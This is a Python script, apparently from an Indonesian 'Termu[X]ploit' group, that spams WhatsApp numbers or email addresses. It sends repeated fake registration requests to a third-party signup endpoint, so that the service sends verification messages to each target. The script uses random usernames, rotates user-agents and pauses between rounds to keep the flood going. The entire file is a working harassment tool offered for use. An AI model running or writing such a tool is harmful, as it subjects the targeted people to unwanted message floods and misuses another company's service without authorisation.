#-*- coding: utf8 -*-
#maapin codenya berantakan

import requests
import random
import time
import os, sys

r = '\033[91m'
c = '\033[96m'
w = '\033[0m'

__banner__ = ('''
%s ###############################
 # %scode : MR.C1M1N             %s#
 # %suse  : python3              %s#
 # %stype : wa/email             %s#
 # %steam : Termu[X]ploit        %s#
 ###############################%s
    ''' % (c,w,c,w,c,w,c,w,c,w))
  
  
class Mate_lampu():
  def __init__(self):
    self.ua=open('ua.txt').read().splitlines()
    os.system('clear')
    print(__banner__)
    self.sok_aelu()
    
  def sok_aelu(self):
    type = str(input('[?] type : '))
    if type == 'wa':
      self.tolol = 'phone_number'
      self.goblok=str(input('[?] Masukan No.Wa  (Pisahkan Dengan Koma) : '))
    elif type == 'email':
      self.tolol= 'email'
      self.goblok=str(input('[?] Masukan Email  (Pisahkan Dengan Koma) : '))
    else:
      Mate_lampu()
    self.goblok = self.goblok.split(",")
    self.saapa=int(input('[?] Masukan Jumlah : '))
    print('[!] Delay 4 Menit Gayn :v')
    for angka in range(1,self.saapa+1):
      for x in self.goblok:
        self.spam_kuy(x,angka)
      time.sleep(240)
    quit('%s[%s#%s]%s Selesai...' % (r,c,r,w))
    
    
  def uname(self):
    uname = ''
    for x in range(12):
      uname += random.choice('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890')
    return uname
    
    
  def spam_kuy(self,nomorna,angka):
    #for i in range(1+self.saapa+1):
      ceko = requests.post('https://core.ktbs.io/v2/user/registration/temp',headers={'user-agent':random.choice(self.ua)}, json={'full_name':self.uname(),'user_id':nomorna,'user_id_type':self.tolol})
      if ceko.status_code == 200:
        print(' %s[%d] Pesan : %ssukses spam ke : %s gan hehe :"c ' % (w,angka,c,nomorna))
      else:
        print(' %s[%d] Pesan : %s%s' % (w,angka,r,ceko.json()['errors'][0]['details']['id']))
        
        
        
        
        
        
        
        
        
        
# ------main-------
  
try:
  sys.exit(Mate_lampu())
except Exception as _er:
    quit('%serror: %s' % (r,_er))
